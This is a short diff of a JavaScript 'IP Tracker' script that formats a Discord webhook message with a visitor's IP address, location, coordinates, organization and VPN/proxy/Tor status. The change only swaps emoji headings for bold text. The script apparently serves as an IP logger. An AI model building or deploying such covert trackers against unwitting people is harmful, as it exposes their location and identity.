@@ -24,22 +24,22 @@
                 username: "IP Tracker",
                 avatar_url: "https://www.experten.de/content.4923677.images.wpdht.Netzwerk-IP-180806077-AS-flashmovie.jpg", 
                 embeds: [{
-                    title: "🌍 IP Information",
+                    title: "IP Information",
                     color: 000000,
                     fields: [
                         {
                             name: "",
                             value: 
-                                "📌 IP Address\n" + 
+                                "**IP Address**\n" + 
                                 "`" + (info.ip || 'N/A') + "`\n\n" +
-                                "📍 Location\n" + 
+                                "**Location**\n" + 
                                 "`City:         " + (info.city || 'N/A') + "`\n" + 
                                 "`Region:       " + (info.region || 'N/A') + "`\n" + 
                                 "`Country:      " + (info.country || 'N/A') + "`\n" + 
                                 "`Coordinates:  " + (info.loc || 'N/A') + "`\n\n" +
-                                "🏢 Organization\n" + 
+                                "**Organization**\n" + 
                                 "`Org:          " + (info.org || 'N/A') + "`\n\n" +
-                                "🔒 Privacy Details\n" + 
+                                "**Privacy Details**\n" + 
                                 "`VPN:          " + (info.privacy?.vpn ? "True" : "False") + "`\n" + 
                                 "`Proxy:        " + (info.privacy?.proxy ? "True" : "False") + "`\n" + 
                                 "`Tor:          " + (info.privacy?.tor ? "True" : "False") + "`\n" + 
